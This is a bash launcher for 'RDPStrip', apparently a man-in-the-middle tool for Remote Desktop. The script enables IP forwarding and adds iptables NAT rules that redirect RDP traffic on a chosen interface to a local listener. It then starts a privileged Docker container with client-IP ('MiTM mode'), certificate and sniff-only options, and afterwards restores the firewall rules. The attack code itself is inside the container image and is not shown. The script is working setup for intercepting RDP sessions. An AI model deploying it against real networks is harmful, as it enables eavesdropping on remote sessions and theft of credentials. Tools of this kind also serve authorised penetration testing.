#!/bin/bash

# Check if the script is being run as root
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root." 1>&2
    exit 1
fi

# Check if required tools are installed
REQUIRED_TOOLS=("iptables" "ip" "docker")

for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v $tool &> /dev/null; then
        echo "Error: $tool is not installed. Please install it before running the script." 1>&2
        exit 1
    fi
done

# Default values
LISTEN_PORT=3389        # Default listening port
LOG_FILE="rdpstriplog"  # Default log file
CERT="cert"             # Default certificate file
SNIFF_ONLY=false        # Default: not sniff only

# Parse arguments
while getopts ":m:f:p:o:c:i:s" opt; do
    case $opt in
        m) CLIENT_IP="$OPTARG" ;;  # IP del cliente (modo MiTM)
        f) FORWARD="$OPTARG" ;;    # IP y puerto del servidor
        p) LISTEN_PORT="$OPTARG" ;;# Puerto de escucha (por defecto 3389)
        o) LOG_FILE="$OPTARG" ;;   # Archivo de log
        c) CERT="$OPTARG" ;;       # Certificados (por defecto 'cert')
        i) INTERFACE="$OPTARG" ;;  # Interfaz de red (sin valor por defecto)
        s) SNIFF_ONLY=true ;;      # Modo solo sniffing
        \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
        :) echo "Option -$OPTARG requires an argument." >&2; exit 1 ;;
    esac
done

# Validate required parameters
if [ -z "$FORWARD" ] || [ -z "$INTERFACE" ]; then
    echo "Usage: $0 -m <client-ip> -f <ip:port> -i <interface> [-p <listen-port>] [-o <log-file>] [-c <cert>] [-s]" >&2
    exit 1
fi

# Extract forward IP and port
FORWARD_IP=$(echo "$FORWARD" | cut -d':' -f1)
FORWARD_PORT=$(echo "$FORWARD" | cut -d':' -f2)

# Default port if not specified in -f
FORWARD_PORT=${FORWARD_PORT:-3389}

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "IP forwarding is enabled."

# Save current iptables configuration
echo "Saving current iptables configuration..."
iptables-save > /tmp/iptables-backup

# Set up iptables for traffic redirection
echo "Setting up iptables rules for traffic redirection..."
iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --destination-port "$FORWARD_PORT" -j REDIRECT --to-port "$LISTEN_PORT"
iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -j ACCEPT

# Run the Docker container
echo "Starting RDPStrip..."
docker run --rm --privileged --network host --cap-add=NET_ADMIN --cap-add=NET_RAW -it rdpstrip-docker \
    -m "$CLIENT_IP" -f "$FORWARD" -p "$LISTEN_PORT" -o "$LOG_FILE" -c "$CERT" -i "$INTERFACE" ${SNIFF_ONLY:+-s}

# Disable IP forwarding after the container runs
echo 0 > /proc/sys/net/ipv4/ip_forward
echo "IP forwarding is disabled."

# Restore original iptables configuration
echo "Restoring original iptables configuration..."
iptables-restore < /tmp/iptables-backup
echo "Original iptables configuration restored."

# Clean up
rm /tmp/iptables-backup
echo "Script execution completed."
